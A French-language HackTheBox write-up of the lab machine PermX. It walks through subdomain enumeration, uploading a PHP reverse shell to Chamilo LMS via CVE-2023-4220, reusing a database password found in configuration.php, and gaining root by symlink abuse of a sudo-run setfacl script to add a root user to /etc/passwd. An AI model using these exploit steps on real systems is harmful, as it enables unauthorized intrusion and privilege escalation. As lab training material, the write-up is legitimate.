---
title: HTB | PermX
description: PermX is an Easy Difficulty Linux machine featuring a learning management system vulnerable to unrestricted file uploads via CVE-2023-4220. This vulnerability is leveraged to gain a foothold on the machine. Enumerating the machine reveals credentials that lead to SSH access. A sudo misconfiguration is then exploited to gain a root shell.
slug: permx-htb
date: 2024-08-04 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="PermX cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">PermX</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.23</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
Port 80 http ouvert.

## Foothold : www-data

### permx.htb
Lorsqu'on accede au port 80 sur un navigateur, on est redirigé vers : **permx.htb**. Je l'ai ajouté dans /etc/hosts et j'ai accéder à un site internet.

### subdomain / vhost attack
```bash
## Ne trouve rien...
$ gobuster dns -d permx.htb -t 50 -w /usr/share/wordlists/dnsmap.txt

## Fonctionne ! (Apparement beaucoup plus fiable que gobuster dns pour trouver les sous-domaines et vhosts...)
$ ffuf -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -u http://permx.htb/ -H "Host: FUZZ.permx.htb" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 544ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 502ms]
```
On trouve les sous-domaines :
- **www**
- **lms**

### www.permx.htb
Renvoie sur la meme page que `permx.htb`

### lms.permx.htb
Renvoie vers une page de login "**Chamilo**"

### enumeration des dossiers/fichiers
```bash
gobuster dir -u lms.permx.htb -w ~/wordlists/common.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lms.permx.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/leopold/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/app                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/app/]
/bin                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/bin/]
/certificates         (Status: 301) [Size: 321] [--> http://lms.permx.htb/certificates/]
/.htaccess            (Status: 403) [Size: 278]
/documentation        (Status: 301) [Size: 322] [--> http://lms.permx.htb/documentation/]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/favicon.ico          (Status: 200) [Size: 2462]
/index.php            (Status: 200) [Size: 19356]
/LICENSE              (Status: 200) [Size: 35147]
/main                 (Status: 301) [Size: 313] [--> http://lms.permx.htb/main/]
/plugin               (Status: 301) [Size: 315] [--> http://lms.permx.htb/plugin/]
/robots.txt           (Status: 200) [Size: 748]
/server-status        (Status: 403) [Size: 278]
/src                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/src/]
/vendor               (Status: 301) [Size: 315] [--> http://lms.permx.htb/vendor/]
/web                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/web/]
/web.config           (Status: 200) [Size: 5780]
```

On trouve notamment le fichier `web.config` qui semble intéressant.
(Finalement inutile)

### Chamilo LMS CVE-2023-4220 Exploit
En cherchant sur internet, on trouve une CVE de 2023 sur Chamilo qui permet d'uploader puis d'executer un fichier php sur la machine:
Exploit Title : Chamilo LMS CVE-2023-4220 Exploit

En utilisant la CVE, on upload un reverse shell php :
```bash
./CVE-2023-4220.sh -f ../php-reverse-shell.php -h http://lms.permx.htb/ -p 6789

-e 
The file has successfully been uploaded.

-e #    Use This leter For Interactive TTY ;)  
##    python3 -c 'import pty;pty.spawn("/bin/bash")'
##    export TERM=xterm
##    CTRL + Z
##    stty raw -echo; fg
-e 
## Starting Reverse Shell On Port 6789 . . . . . . .
-e 
Listening on 0.0.0.0 6789
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at lms.permx.htb Port 80</address>
</body></html>


ls


Connection received on 10.10.11.23 56516
Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 14:35:56 up  5:55,  2 users,  load average: 0.00, 0.14, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ $ bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
```

Ensuite, on execute le fichier désormais présent dans le dossier et ça ouvre le reverse shell:
```bash
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/reverseshell.php
```

## www-data -> mtz

### User Found : mtz
On trouve le user **mtz** dans le **/home**.

### configuration.php : mtz password
Après l'execution de **linpeas.sh**, on trouve un mot de passe :
```bash
╔══════════╣ Searching passwords in config PHP files
/var/www/chamilo/app/config/configuration.php:                'show_password_field' => false,
/var/www/chamilo/app/config/configuration.php:                'show_password_field' => true,
...
/var/www/chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
...
```
On peut désormais se connecter avec le mot de passe **03F6lY3uXAP2bkW8** pour l'utilisateur **mtz** :
```bash
www-data@permx:/home$ su mtz
Password: 03F6lY3uXAP2bkW8
mtz@permx:/home$ cat us
cat: us: No such file or directory
mtz@permx:/home$ ls
mtz
mtz@permx:/home$ cd mtz/
mtz@permx:~$ cat user.txt 
a45e.....7836
```

## Privilege Escalation

### /opt/acl.sh as root
On fait sudo -l, on observe que l'on peut executer le script suivant en tant que root :
**/opt/acl.sh**
```bash
##!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

## Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

Il permet de modifier les droits de n'importe quel fichier. Cependant, il faut que ce fichier soit dans /home/mtz et qu'il soit un fichier, pas un lien symbolique.

La technique consiste donc à créer deux liens symboliques qui vont vers le fichier qui nous intéresse.
Ensuite on change les droits

J'ai donc modifier les droits de /etc/passwd pour pouvoir le modifier en tant que **mtz**.
On ajoute un utilisateur hacker, avec le mdp "password" qui a les droits root
On se connecte à hacker et on affiche le fichier root.txt avec le flag.

!!ATTENTION!!, il y a une contab qui retablit les fichiers /etc/passwd et qui supprime les liens symboliques dans /home/mtz donc il faut le faire rapidement...

```bash
$ ln -s /etc/passwd .a && ln -s .a .b && sudo /opt/acl.sh mtz rwx /home/mtz/.b && cat /etc/passwd
## Affichage de /etc/passwd

## Ajout d'un utilisateur hacker avec les droits root et le mot de passe "password"
$ vi /etc/passwd
...
...

hacker:$6$XbyWNHgUybMiBnVK$FOoR2G.C.YAk0TAzOcf2igmcoVWkJtzDQgs7C4TmE7fazCwasTsutVY.5AR8CkiA7cBcGGx8cHdPtUUdkXOGA1:0:0::/root:/bin/bash

$ su hacker
Password: password
$ cat /root/root.txt
1808.....4142
```